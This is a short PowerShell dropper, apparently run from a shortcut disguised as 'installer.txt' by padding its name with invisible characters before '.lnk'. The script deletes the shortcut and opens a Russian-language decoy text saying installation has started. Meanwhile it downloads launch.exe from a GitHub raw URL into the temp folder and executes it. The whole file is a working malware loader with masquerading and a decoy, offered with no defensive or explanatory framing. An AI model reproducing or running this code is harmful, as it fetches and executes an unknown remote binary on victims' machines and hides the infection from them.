$folder = (Get-Location).Path

$lnk = Join-Path $folder "installer.txt⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀.lnk"
$txt = Join-Path $folder "installer.txt"

if (Test-Path $lnk) {
    Remove-Item $lnk -Force
}

@"
Установка запущена.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

Start-Process notepad.exe $txt

$wc = New-Object System.Net.WebClient
$wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
& "$env:TEMP\a.exe"
